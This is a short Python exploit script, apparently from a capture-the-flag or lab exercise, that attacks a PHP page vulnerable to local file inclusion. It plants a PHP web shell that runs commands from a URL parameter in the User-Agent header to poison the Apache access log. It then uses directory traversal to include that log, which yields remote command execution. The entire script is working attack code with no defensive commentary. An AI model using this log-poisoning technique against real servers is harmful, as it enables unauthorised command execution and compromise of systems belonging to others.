import requests
url = "http://10.10.44.95/"
headers = {
	'User-Agent': '<?php echo system($_GET["lfi"]); ?>'
}

response = requests.get(url + "lfi/lfi.php?page=../../../../../../var/log/apache2/access.log", headers = headers)
print(response.text)
